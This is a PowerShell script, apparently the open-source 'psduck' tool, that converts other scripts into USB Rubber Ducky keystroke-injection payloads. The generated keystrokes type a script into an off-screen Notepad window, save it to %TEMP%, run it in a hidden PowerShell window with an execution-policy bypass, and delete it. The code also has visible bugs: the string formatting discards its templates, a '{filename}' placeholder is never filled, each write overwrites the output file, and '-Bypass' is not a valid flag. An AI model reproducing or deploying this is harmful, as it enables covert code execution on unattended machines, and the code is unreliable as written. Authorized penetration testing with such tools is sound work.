﻿<#
.SYNOPSIS

A PowerShell script for converting other PowerShell scripts to USB Rubber Ducky payloads
https://github.com/seanthegeek/psduck

Copyright 2016 Sean Whalen

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.

Author: Sean Whalen (@SeanTheGeek)
Version: 1.0.0
Required Dependencies: Java runtime
Optional Dependencies: None
    
.DESCRIPTION

A PowerShell script for converting other PowerShell scripts to USB Rubber Ducky payloads

.PARAMETER Path

The path to the script to convert
#>

[CmdletBinding()] param(
  [Parameter(Position = 0,Mandatory = $True)]
  [string]$Path
)

$ScriptPath = Split-Path -Parent $MyInvocation.MyCommand.Definition

Import-Module (Join-Path $ScriptPath DTW.PS.FileSystem.Encoding.psm1)
Import-Module (Join-Path $ScriptPath DTW.PS.PrettyPrinterV1.psm1)
Import-Module (Join-Path $ScriptPath minJS.psm1)


function GetDownArrows ([int]$Number) {

  return "DOWNARROW`n" * $Number
}

[string]$Path = Resolve-Path $Path
$RandomFileName = [System.IO.Path]::GetRandomFileName().Split(‘.’)[0]
$TxtPath = $Path + ".txt"

Edit-DTWCleanScript $Path
$content = [IO.File]::ReadAllText($Path)
$MinContent = minify $content -inputDataType "ps1"
$MinPath = $Path.Split(".")[0..-1][0] + ".min.ps1"
$MinContent | Out-File $MinPath -Encoding ascii

$DownArrows = GetDownArrows 61
$DownArrows = $DownArrows.Trim()

$PreScript = @"
DELAY 750
GUI
DELAY 750
STRING notepad
ENTER
DELAY 750
ENTER
ALT SPACE
DELAY 750
STRING m
DELAY 750
{0}
DELAY 750
ENTER
"@

$PreScript = [string]::Format($DownArrows)

$PostScript = @"

DELAY 500
ENTER
CTRL S
DELAY  750
STRING %TEMP%\{0}.ps1
ENTER
DELAY 750
ALT F4
DELAY 750
GUI
DELAY 750
STRING powershell.exe -Bypass -WindowStyle hidden -File %TEMP%\{0}.ps1
ENTER
DELAY 750
GUI
DELAY 750
STRING powershell Remove-Item %TEMP%\{filename}.ps1
ENTER
"@
$PostScript = [string]::Format($RandomFileName)
$PreScript | Out-File -Encoding ascii $TxtPath
$PsLines = Get-Content $MinPath
foreach ($line in $PsLines) {
  [string]::Format("STRING {0}`nENTER",$line.Trim()) | Out-File -Encoding ascii $TxtPath
}
$PostScript | Out-File -Encoding ascii $TxtPath
java -jar (Join-Path $ScriptPath encoder.jar) -i $TxtPath